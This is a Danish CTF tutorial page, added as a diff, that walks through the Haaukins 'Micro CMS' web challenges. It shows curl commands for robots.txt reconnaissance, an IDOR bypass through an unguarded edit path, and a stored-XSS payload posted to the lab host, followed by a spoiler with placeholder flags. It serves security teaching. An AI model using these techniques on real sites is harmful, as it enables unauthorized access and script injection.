@@ -1,0 +1,45 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: Micro CMS — tutorial (Robots, URL/IDOR, stored XSS)</title>
+<meta name="description" content="Guide til Haaukins Micro CMS Robots &amp; Micro CMS URL: robots.txt-recon, adgangskontrol-bypass via editor-stien (IDOR), og stored XSS der belønnes server-side.">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>Micro CMS (Robots / URL / XSS)</h1>
+<p class="subtitle">Tre klassiske web-bugs i ét lille PHP-site.</p>
+<div class="badges"><span class="badge cat">Web exploitation</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+
+<h2>Micro CMS Robots — robots.txt afslører en skjult sti</h2>
+<pre><code>curl http://microcms.com/robots.txt      # Disallow: /secret/
+curl http://microcms.com/secret/          # "This is a secret: HKN{...}"</code></pre>
+             <p>Hent ALTID <code>/robots.txt</code> — Disallow-stier er gratis efterretning.</p>
+<h2>Micro CMS URL — IDOR / broken access control</h2>
+<p>Sider vises via <code>page.php?view=N</code>. <code>view=4</code> giver 403, men editor-stien
+             <code>edit=N</code> har ingen adgangskontrol og rammer samme ressource:</p>
+             <pre><code>curl "http://microcms.com/page.php?view=4"   # Forbidden
+curl "http://microcms.com/page.php?edit=4"   # &lt;textarea&gt;The Secret is: HKN{...}&lt;/textarea&gt;</code></pre>
+<h2>Stored XSS — belønnet server-side</h2>
+<pre><code>curl -X POST "http://microcms.com/page.php?add" \
+  --data-urlencode 'title=pwn' --data-urlencode 'content=&lt;img src=x onerror=alert(1)&gt;'</code></pre>
+             <p>Når du ser siden, injicerer serveren selv flaget — ingen admin-bot nødvendig.</p>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Tre flag (ét pr. del); den sidste står inde i <code>&lt;script&gt;alert("flag{HKN{...}}")&lt;/script&gt;</code>
+        (flaget er den indre <code>HKN{...}</code>).</p>
+        <p><strong>Platform-quirk:</strong> det rigtige flag kan give HTTP 500 men stadig registreres — tjek
+        <code>solved:true</code>, ikke statuskoden.</p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li><code>robots.txt</code> lækker skjulte stier.</li><li>Broken access control: samme ressource via en anden sti (view→edit) kan omgå 403.</li><li>Stored XSS i usaniteret input; nogle platforme belønner det server-side uden en bot.</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
